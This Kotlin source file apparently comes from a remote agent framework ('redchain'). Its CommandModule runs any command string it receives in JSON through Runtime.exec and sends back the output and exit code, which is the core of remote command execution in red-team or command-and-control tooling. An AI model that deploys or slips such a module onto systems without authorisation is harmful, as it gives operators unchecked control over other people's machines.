package com.redchain.agent.modules

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader

object CommandModule {

    suspend fun execute(params: JSONObject): JSONObject = withContext(Dispatchers.IO) {
        val command = params.getString("command")

        try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            val exitCode = process.waitFor()

            JSONObject().apply {
                put("command", command)
                put("exit_code", exitCode)
                put("output", output)
                put("success", exitCode == 0)
            }
        } catch (e: Exception) {
            JSONObject().apply {
                put("command", command)
                put("error", e.message)
                put("success", false)
            }
        }
    }
}
